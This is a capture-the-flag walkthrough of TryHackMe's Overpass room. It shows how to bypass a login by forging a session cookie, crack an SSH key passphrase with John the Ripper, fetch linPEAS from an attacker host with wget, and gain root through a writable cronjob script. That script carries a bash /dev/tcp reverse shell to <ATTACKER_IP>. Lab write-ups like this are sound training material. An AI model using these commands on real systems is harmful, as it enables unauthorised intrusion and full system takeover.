---
title: "Quick and Easy Overpass CTF TryHackMe Walkthrough"
slug: overpass-ctf
layout: post
excerpt_separator:  <!--more-->
categories:
  - ctfs
---

This walkthrough covers the [Overpass](https://tryhackme.com/room/overpass) CTF found on [TryHackMe](https://tryhackme.com). This room aims to exploit a vulnerable web application through a flawed authentication measure, obtain an initial foothold using exposed SSH keys, and then escalate privileges to root by injecting a reverse shell into a cronjob with poorly managed permissions.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693151396473/db4e3302-2a8f-4e91-87b0-ccd63a41788c.png){: .center-image }

### Step 1: Nmap Scan

As always, we'll begin our penetration test by enumerating the network to identify running services.

```bash
sudo nmap -sV -p- -T4 -Pn 10.10.62.26 --disable-arp-ping --max-retries=0
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693162687231/1e4a9cb9-8600-4e3b-a2c8-a34498b8f58c.png){: .center-image }

Let's examine and see what we can obtain from the web server using `ffuf`.

### Step 2: Web Enumeration

```bash
sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://10.10.62.26/FUZZ -t 10
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693162777077/d6c2e40e-d6e2-4dad-a782-03c0cb200667.png){: .center-image }

### Step 3: Initial Foothold

The `/admin` directory appears promising. Let's navigate to it and explore what we can do with it.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693162827321/33d4cb35-5eb5-4cc2-857f-10597d6dbe5c.png){: .center-image }

Upon examining the source code, we discover a JavaScript file named `login.js`.

```javascript
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

This script contains a vulnerability listed in the `OWASP Top 10`, known as `Broken Authentication`.

```javascript
    } else { 
        Cookies.set("SessionToken",statusOrCookie) 
        window.location = "/admin" 
    }
}
```

Using `Developer Tools (F12)` and navigating to `Storage` (in Firefox), we can add a new item and create a `SessionToken` with a value of "`admin`" inside it.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693163060518/c3ca7113-622d-4295-a8c3-2c8fc193a9a7.png){: .center-image }

This enables us to circumvent the login necessity. After gaining access, we came across an `SSH` key belonging to a user named `James`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693163115324/4f12413f-3207-4136-89a8-f271cbc276ea.png){: .center-image }

We can use `ssh2john` and `john-the-ripper` to crack the passphrase for this.

Save the `SSH` key in a file named `id_rsa`, and then execute the following commands:

```bash
python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
```

Then run `john`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693163364720/a6704e43-c596-4a14-b20e-2f4cc9119d6f.jpeg){: .center-image }

Set the permissions for the `id_rsa` file.

```bash
chmod 600 id_rsa
```

Log in to the target.

```bash
ssh -i id_rsa james@<TARGET_IP>
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693163459398/1b740587-69f5-4bcc-a530-7f916b65f135.png){: .center-image }

Grab the `user.txt` flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693163488021/242cc56c-2e25-4a22-8bd0-1ef7fe8e5882.jpeg){: .center-image }

### Step 4: Privesc and Root

Begin by starting an HTTP server to transfer `linPEAS`, which will help enumerate the system for potential privilege escalation vectors.

```bash
python3 -m http.server 1337
```

Download `linPEAS` to the victim.

```bash
wget http://<ATTACKER_IP>/linpeas_linux_amd64
```

Make it executable.

```bash
chmod +x linpeas_linux_amd64
```

Run it.

```bash
./linpeas_linux_amd64
```

Upon analyzing the results, we discovered a vulnerability in the cron jobs.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693163689197/09cbd9e9-ecba-44d1-b0c0-8b868d5b2844.png){: .center-image }

Every minute, precisely on the minute, a request is sent to fetch `buildscript.sh` as root. However, this file has write access for regular users, which allows us to modify it with a reverse shell.

First, we want to modify `/etc/hosts` and change `overpass.thm` to our IP address.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693163843395/1b595f21-c2f4-4d56-9a7a-34639c38b19c.png){: .center-image }

The method for escalating privileges here involves altering the IP address of `overpass.thm` to our own and creating a `/downloads/src` directory on our system with a modified `buildscript.sh` file that incorporates a reverse shell for the scheduled task to retrieve.

Create the reverse shell:

```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/1338 0>&1"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693163978286/a3abfc07-0643-4b9a-aff8-85b1a0b38e2e.png){: .center-image }

Then, run an HTTP server from the root directory using the command:

```bash
python3 -m http.server 80
```

After a minute, it will pull the `buildscript.sh` file we created and connect back to our netcat listener on port 1338.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693164132669/92cba98b-36c8-44d1-a86c-04fa45651f2d.png){: .center-image }

And that's it! Once we gain access, we can obtain the `root.txt` flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693164176186/9d40e82b-5889-45e9-9c8d-ddc72c34f459.jpeg){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1693164179848/0c6ab381-a061-4b1d-b786-310466b793ed.png){: .center-image }

### Summary

> In this walkthrough, we will exploit a vulnerable web application on TryHackMe's Overpass CTF by bypassing a flawed authentication measure, obtaining an initial foothold using exposed SSH keys, and escalating privileges to root through a reverse shell injected into a cronjob with poorly managed permissions. The steps include an Nmap scan, using ffuf for network enumeration, gaining initial access, and escalating privileges to obtain the root flag.